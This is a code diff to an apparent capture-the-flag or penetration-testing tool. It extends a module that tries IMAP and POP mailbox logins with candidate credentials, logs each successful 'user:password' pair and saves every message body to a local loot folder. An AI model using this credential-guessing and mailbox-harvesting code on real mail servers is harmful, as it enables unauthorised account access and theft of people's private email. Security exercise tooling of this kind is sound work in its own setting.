@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import concurrent.futures
 import imaplib
+import os
 import poplib
 import re
 from email import message_from_bytes
@@ -73,9 +74,11 @@ def run(host: HostReport, opts) -> None:
         for result in pool.map(probe, users[:_MAX_ATTEMPTS]):
             if not result:
                 continue
-            user, pw, body = result
+            user, pw, msgs = result
             hits += 1
             utils.log("hot", f"mailbox login: {user}:{pw}", indent=1)
+            _report_mailbox(host, ip, user, msgs)
+            body = "\n\n".join(msgs)
             host.add_cred(pw)
             host.add(Finding(
                 title=f"Mailbox access: {user}",
@@ -148,7 +151,7 @@ def _imap(ip, port, user, pw):
             M.logout()
         except Exception:
             pass
-    return "\n".join(text)
+    return text          # login succeeded (possibly empty mailbox)
 
 
 def _folders(M):
@@ -194,7 +197,7 @@ def _pop(ip, port, user, pw):
             P.quit()
         except Exception:
             pass
-    return "\n".join(text)
+    return text
 
 
 def _msg_text(raw: bytes) -> str:
@@ -228,6 +231,32 @@ def _dh(value: str) -> str:
         return "".join(out)
     except Exception:
         return value
+
+
+def _report_mailbox(host: HostReport, ip: str, user: str, msgs) -> None:
+    """Never read a mailbox silently: show its message subjects and save every
+    body to loot, so the next step (a cred, a link, the flag) is visible even
+    when no regex matches it."""
+    if not msgs:
+        utils.log("warn", f"{user}'s mailbox opened but is empty/unreadable — the "
+                          "next hop may be another user's mailbox or the webmail "
+                          "UI (log into Roundcube as this user)", indent=2)
+        return
+    utils.log("good", f"{len(msgs)} message(s) in {user}'s mailbox:", indent=2)
+    for m in msgs[:12]:
+        first = next((ln.strip() for ln in m.splitlines() if ln.strip()), "")
+        utils.log("dim", f"  • {first[:88]}", indent=2)
+    try:
+        d = os.path.join(os.getcwd(), "scryer_loot", ip, "mail",
+                         re.sub(r"[^A-Za-z0-9._@-]", "_", user))
+        os.makedirs(d, exist_ok=True)
+        for i, m in enumerate(msgs[:_MAX_MSGS]):
+            with open(os.path.join(d, f"msg{i + 1:02d}.txt"), "w") as fh:
+                fh.write(m)
+        utils.log("good", f"saved {min(len(msgs), _MAX_MSGS)} message(s) -> {d}",
+                  indent=2)
+    except OSError:
+        pass
 
 
 def _mine(host: HostReport, user: str, body: str, port: int) -> None:
